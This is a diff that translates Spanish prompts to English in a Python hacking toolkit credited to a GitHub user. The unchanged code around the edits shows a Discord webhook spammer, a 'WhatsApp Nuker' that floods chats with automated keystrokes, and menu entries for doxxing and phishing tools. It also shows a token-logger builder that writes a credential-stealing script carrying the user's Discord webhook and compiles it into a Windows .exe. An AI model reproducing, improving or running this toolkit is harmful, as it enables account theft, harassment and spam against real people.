@@ -28,13 +28,13 @@ def spam():
  ╚══╝╚══╝ ╚══════╝╚═════╝ ╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝    ╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝
   """)
   try:
-    webhook = input('\n[+] Ingresa el link de la webhook: ')
-    mensaje = input('[+] Ingresa el mensaje que quieres enviar en la webhook: ')
+    webhook = input('\n[+] Enter the link for the webhook: ')
+    mensaje = input('[+] Enter the message you want to send in the webhook: ')
     while True:
       requests.post(webhook, json={'username': 'Spammer', 'content': mensaje})
-      print('\n[~] Enviando mensaje...')
+      print('\n[~] Sending message...')
   except KeyboardInterrupt:
-    print('\n[~] Deteniendo spam...')
+    print('\n[~] Stopping spam...')
     time.sleep(1)
     menu()
 
@@ -54,8 +54,8 @@ def tools():
     |                                                                                          |    
     | [1] Doxxing Tools                                                                        |
     | [2] Phishing Tools                                                                       |
-    | [00] Regresar al menu principal                                                          |
-    | [99] Salir                                                                               |
+    | [00] Return to main menu                                                          |
+    | [99] Quit                                                                               |
     |------------------------------------------------------------------------------------------|
    """)
    a = input('\nroot@fuckyou:~# ')
@@ -68,7 +68,7 @@ def tools():
    elif a == "99":
      exit()
    else:
-      print(f'\n{Fore.RED}[!] Error opcion invalida.')
+      print(f'\n{Fore.RED}[!] Error invalid option.')
       time.sleep(2)
       tools()
 
@@ -104,7 +104,7 @@ def creds():
                       |   https://github.com/Euronymou5                |
                       |------------------------------------------------|
   ''')
-  input('\n[~] Presiona enter para continuar...')
+  input('\n[~] Press enter to continue...')
   menu()
 
 def tracker():
@@ -125,29 +125,29 @@ def waspam():
                                            | |   | |                                
                                            |_|   |_|                               
     """)
-    print('\n[~] Abriendo whatsapp...')
+    print('\n[~] Opening whatsapp...')
     webbrowser.open_new_tab('https://web.whatsapp.com/')
-    input(f'\n{Fore.YELLOW}[~] Una vez dentro de whatsapp web, escanea el codigo qr y pulsa enter...')
-    mensaje = input(f'\n{Fore.BLUE}[~] Ingresa el mensaje que quieres enviar: ')
+    input(f'\n{Fore.YELLOW}[~] Once inside WhatsApp web, scan the QR code and press enter...')
+    mensaje = input(f'\n{Fore.BLUE}[~] Enter the message you want to send: ')
     if mensaje == "" or mensaje == " ":
-        print(f'\n{Fore.RED}[!] Error debes de ingresar un mensaje.')
+        print(f'\n{Fore.RED}[!] Error you must enter a message.')
         time.sleep(3)
         waspam()
     else:
-        cantidad = int(input(f'\n{Fore.BLUE}[~] Ingresa la cantidad de mensajes que quieres enviar: '))
+        cantidad = int(input(f'\n{Fore.BLUE}[~] Enter the number of messages you want to send: '))
         if cantidad == 0:
-            print(f'\n{Fore.RED}[!] Error debes de ingresar una cantidad.')
+            print(f'\n{Fore.RED}[!] Error you must enter an amount.')
             time.sleep(3)
             waspam()
         elif cantidad <= 0:
-           print(f'\n{Fore.RED}[!] Error debes de ingresar una cantidad correcta.')
+           print(f'\n{Fore.RED}[!] Error you must enter a correct amount.')
            time.sleep(3)
            waspam()
         else:
-            print('\n[~] El mensaje se enviara en 5 segundos, recuerda entrar al chat que quieres nukear...')
+            print('\n[~] The message will be sent in 5 seconds, remember to enter the chat you want to nuke...')
             time.sleep(5)
             for _ in range(cantidad):
-                print('\n[~] Enviando mensaje...')
+                print('\n[~] Sending message...')
                 keyboard.write(mensaje)
                 keyboard.press_and_release('enter')
             menu()
@@ -166,7 +166,7 @@ def tokenlogger():
         os.remove('logger.py')
     else:
         pass
-    variable_hook = input(f'\n{Fore.GREEN}[~] Ingresa Tu WebHook de discord: ')
+    variable_hook = input(f'\n{Fore.GREEN}[~] Enter Your Discord WebHook: ')
     f = open('logger.py', 'w')
     f.write('''import os
 if os.name != "nt":
@@ -243,60 +243,60 @@ def main():
 if __name__ == '__main__':
     main()'''.replace("webnook", variable_hook))
     f.close()
-    print(f'\n{Fore.YELLOW}[~] Compilando token logger...')
+    print(f'\n{Fore.YELLOW}[~] Compiling token logger...')
     time.sleep(2)
-    print(f'\n{Fore.YELLOW}[~] Detectando os...')
+    print(f'\n{Fore.YELLOW}[~] Detecting os...')
     if platform.system() == "Linux":
         print(
-            f'\n{Fore.RED}[✘] No es posible compilar un .exe para linux abortando...'
+            f'\n{Fore.RED}[✘] It is not possible to compile an .exe for linux. Aborting...'
         )
         time.sleep(2)
         menu()
     elif platform.system() == "Darwin":
         print(
-            f'\n{Fore.RED}[✘] No es posible compilar un .exe para MAC OS abortando...'
+            f'\n{Fore.RED}[✘] It is not possible to compile an .exe for MAC OS. Aborting...'
         )
         time.sleep(2)
         menu()
     elif platform.system() == "Windows":
-        print(f'\n[✔] OS Detectado: Windows')
-        ques = input('\n[?] Quieres agregar un icono a tu .exe? [Y/n]: ')
+        print(f'\n[✔] OS Detected: Windows')
+        ques = input('\n[?] Do you want to add an icon to your .exe? [Y/n]: ')
         if ques == "Y" or ques == "y":
-            print('\n[~] Ejemplo: C:\\Users\\Desktop\\icon.ico')
-            icon = input('\n[~] Ingresa la ubicacion de tu archivo .ico: ')
+            print('\n[~] Example: C:\\Users\\Desktop\\icon.ico')
+            icon = input('\n[~] Enter the location of your .ico file: ')
             if len(icon) == 0:
-                print(f'\n{Fore.RED}[✘] Error debes ingresar una ubicacion.')
+                print(f'\n{Fore.RED}[✘] Error you must enter a location.')
                 time.sleep(2)
                 menu()
             else:
                 os.system(f'pyinstaller --onefile --icon="{icon}" logger.py')
                 print(
-                    f'\n{Fore.GREEN}[✔] Token logger compilado exitosamente.')
+                    f'\n{Fore.GREEN}[✔] Token logger compiled successfully.')
                 os.remove("logger.spec")
                 shutil.rmtree('build')
                 shutil.move("dist/logger.exe", "output")
                 shutil.rmtree('dist')
-                print(f'{Fore.GREEN}\n[~] Token logger movido a la carpeta: output/logger.exe')
+                print(f'{Fore.GREEN}\n[~] Token logger moved to folder: output/logger.exe')
                 time.sleep(3)
                 menu()
         elif ques == "N" or ques == "n":
-            print('\n[~] Convirtiendo token logger a exe...')
+            print('\n[~] Converting token logger to exe...')
             os.system("pyinstaller -y -F logger.py")
-            print(f'\n{Fore.GREEN}[✔] Token logger compilado exitosamente.')
+            print(f'\n{Fore.GREEN}[✔] Token logger successfully compiled.')
             time.sleep(5)
             os.remove("logger.spec")
             shutil.rmtree('build')
             shutil.move("dist/logger.exe", "output")
             shutil.rmtree('dist')
-            print(f'{Fore.GREEN}\n[~] Token logger movido a la carpeta: output/logger.exe')
+            print(f'{Fore.GREEN}\n[~] Token logger moved to folder: output/logger.exe')
             time.sleep(3)
             menu()
         else:
-            print(f'{Fore.RED}[✘] Error opcion invalida.')
+            print(f'{Fore.RED}[✘] Error invalid option.')
             time.sleep(2)
             menu()
     else:
-        print(f'{Fore.RED}[!] Error OS desconocido.')
+        print(f'{Fore.RED}[!] Error, Unkown OS!')
         time.sleep(2)
         menu()
 
@@ -314,19 +314,19 @@ def gen():
 ............\..............(
 ..............\.............\...
     """)
-    tam = int(input(f'\n{Fore.YELLOW}[~] Ingresa la longitud de la contraseña (Maximo 77): '))
+    tam = int(input(f'\n{Fore.YELLOW}[~] Enter the password length (Max 77): '))
     if tam == 77:
-        print(f'\n{Fore.RED}[!] Error la contraseña solo puede tener una longitud menos de 77.')
+        print(f'\n{Fore.RED}[!] Error the password can only be less than 77.')
         time.sleep(3)
         gen()
     elif tam <= 77:
        caracter = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&*(){}[]/\?!@#$abcdefghijklmnopqrstuvwxyz"
        contra = "".join(random.sample(caracter, tam))
        print(f'\n{Fore.GREEN}[~] Contraseña generada: {contra}')
-       input(f'\n{Fore.LIGHTCYAN_EX}[~] Presiona enter para continuar...')
+       input(f'\n{Fore.LIGHTCYAN_EX}[~] Press enter to continue...')
        menu()
     elif tam >= 77:
-        print(f'\n{Fore.RED}[!] Error la contraseña solo puede tener una longitud menos de 77.')
+        print(f'\n{Fore.RED}[!] Error password can only be less than 77 in length.')
         time.sleep(3)
         gen()
 
@@ -351,11 +351,11 @@ def menu():
   |______________$$____$$                           [4] Tools Installer                                             |
   |______________$$____$$                           [5] User Searcher                                               |
   |______________$$____$$                           [6] Scanner Con Nmap                                            |  
-  |__________$$$$$$____$$$$$$                       [7] Generar Contraseñas                                         |
+  |__________$$$$$$____$$$$$$                       [7] Generate Passwords                                         |
   |________$$____$$____$$____$$$$                   [8] WhatsApp Nuker                                              |
-  |________$$____$$____$$____$$__$$                 [00] Creditos                                                   |
+  |________$$____$$____$$____$$__$$                 [00] Credits                                                   |
   |$$$$$$__$$____$$____$$____$$____$$               [98] Update Checker                                             |
-  |$$____$$$$________________$$____$$               [99] Salir                                                      |
+  |$$____$$$$________________$$____$$               [99] Quit                                                      |
   |$$______$$______________________$$                                                                               |
   |__$$____$$______________________$$                                                                               |
   |___$$$__$$______________________$$                                                                               |
@@ -394,17 +394,17 @@ def menu():
             c = version.text
             ola = c.strip()
             if local_version == ola:
-                print(f'\n{Fore.GREEN}[~] No hay versiones disponibles.')
-                input(f'\n{Fore.LIGHTCYAN_EX}[~] Presiona enter para continuar...')
+                print(f'\n{Fore.GREEN}[~] No versions available.')
+                input(f'\n{Fore.LIGHTCYAN_EX}[~] Press enter to continue...')
                 menu()
             else:
-                print(f'\n{Fore.GREEN}[~] Una nueva version hay disponible: {ola}')
-                m = input(f'\n{Fore.LIGHTCYAN_EX}[~] Presiona enter para continuar...')
+                print(f'\n{Fore.GREEN}[~] A new version is available: {ola}')
+                m = input(f'\n{Fore.LIGHTCYAN_EX}[~] Press enter to continue...')
                 menu()
     elif prompt == "99":
         exit()
     else:
-        print(f'\n{Fore.RED}[!] Error opcion invalida.')
+        print(f'\n{Fore.RED}[!] Error invalid Opion.')
         time.sleep(2)
         menu()
 
